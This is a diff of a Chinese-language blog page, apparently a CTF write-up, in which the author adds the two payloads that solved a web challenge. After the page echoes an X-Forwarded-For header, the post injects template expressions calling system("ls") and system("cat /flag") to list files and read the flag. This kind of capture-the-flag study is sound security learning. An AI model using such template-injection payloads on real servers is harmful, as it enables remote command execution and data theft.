@@ -25,14 +25,14 @@
 <meta property="og:image" content="https://i.loli.net/2021/01/22/L7Kyc5H4ZSsqpAG.png">
 <meta property="og:image" content="https://i.loli.net/2021/01/22/ZfEkqNSDOgRCWl9.png">
 <meta property="article:published_time" content="2021-01-22T02:22:19.668Z">
-<meta property="article:modified_time" content="2021-01-22T13:53:59.289Z">
+<meta property="article:modified_time" content="2021-01-22T14:33:42.306Z">
 <meta property="article:author" content="Kyrita">
 <meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://i.loli.net/2021/01/22/f2snd6E1rZ3pywv.png">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,gh/nexmoe/nexmoe.github.io@latest/lib/mdui_043tiny/css/mdui.css,gh/nexmoe/nexmoe.github.io@latest/lib/iconfont/iconfont.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css?v=233" crossorigin>
   
-  <link rel="stylesheet" href="/css/style.css?v=1611323662062">
+  <link rel="stylesheet" href="/css/style.css?v=1611326056830">
 <meta name="generator" content="Hexo 5.3.0"></head>
 
 <body class="mdui-drawer-body-left">
@@ -183,7 +183,7 @@
   
   <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
     <a><i class="nexmoefont icon-calendar-fill"></i>2021年01月22日</a>
-    <a><i class="nexmoefont icon-areachart"></i>187 字</a>
+    <a><i class="nexmoefont icon-areachart"></i>212 字</a>
     <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
 </div>
 
@@ -201,12 +201,20 @@
 <li>添加X-Forwarded-For: 127.0.0.1</li>
 <img src="https://i.loli.net/2021/01/22/qtWNdmsM8lYQCvb.png" >
 
-<p>可以看到IP地址发生了变化,直接将127.0.0.1输出到了页面上;借助搜索引擎我发现一篇<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12238779.html/" title="大佬的博客">大佬的博客</a>里面实际验证了这是一种SSTI模板注入;</p>
-<li>1</li>
+<p>可以看到IP地址发生了变化,直接将127.0.0.1输出到了页面上;借助搜索引擎我发现一篇<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12238779.html">大佬的博客</a>,里面实际验证了这是一种SSTI模板注入;</p>
+<li>尝试构造payload: </li>
+   <pre><code>
+   X-Forwarded-For: &#123;&#123;system("ls")&#125;&#125;
+   </code></pre>
+
 <img src="https://i.loli.net/2021/01/22/L7Kyc5H4ZSsqpAG.png" >
 发现flag文件,利用cat拿取flag;
 
-<li>2</li>
+<li>构造payload: </li>
+   <pre><code>
+   X-Forwarded-For: &#123;&#123;system("cat /flag")&#125;&#125;
+   </code></pre>
+
 <img src="https://i.loli.net/2021/01/22/ZfEkqNSDOgRCWl9.png" >
 
 <p>于是拿到了flag,放入题目中sumbit;yas</p>
@@ -266,7 +274,7 @@
 
 
 <script src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
- <script src="/js/app.js?v=1611323662064"></script>
+ <script src="/js/app.js?v=1611326056831"></script>
 
   
 
